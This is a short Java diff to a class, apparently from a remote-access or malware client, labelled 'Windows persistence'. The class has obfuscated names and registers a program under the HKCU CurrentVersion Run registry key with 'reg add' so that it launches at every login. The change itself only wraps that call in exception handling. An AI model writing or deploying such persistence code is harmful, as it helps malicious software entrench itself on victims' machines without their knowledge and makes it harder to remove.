@@ -1,5 +1,7 @@
 package persistence;
 
+import java.io.IOException;
+
 // Windows persistence.
 public final class e extends a {
     public e(String var1, String var2, boolean var3) {
@@ -16,6 +18,10 @@ public final class e extends a {
         }
 
         // Add a registry entry.
-        Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", super.b, "/t", "REG_SZ", "/d", var1, "/f"});
+        try {
+            Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", super.b, "/t", "REG_SZ", "/d", var1, "/f"});
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 }
